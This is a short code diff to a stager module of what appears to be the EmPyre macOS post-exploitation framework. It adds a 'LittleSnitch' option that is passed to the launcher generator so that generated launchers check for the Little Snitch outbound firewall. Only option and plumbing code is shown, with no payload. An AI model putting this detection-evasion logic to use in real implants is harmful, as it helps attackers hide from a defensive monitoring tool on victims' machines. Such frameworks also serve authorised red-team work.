@@ -57,6 +57,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'LittleSnitch' : {
+                'Description'   :   'Set for stagger LittleSnitch checks.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -96,6 +101,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        littleSnitch = self.options['LittleSnitch']['Value']
 
         isEmpire = self.mainMenu.listeners.is_listener_empyre(listenerName)
         if not isEmpire:
@@ -103,12 +109,13 @@ class Module:
             return ""
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, littlesnitch=littleSnitch)
         launcher = launcher.replace("'", "\\'")
         launcher = launcher.replace('"', '\\"')
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
+
         script = """
 
 import os
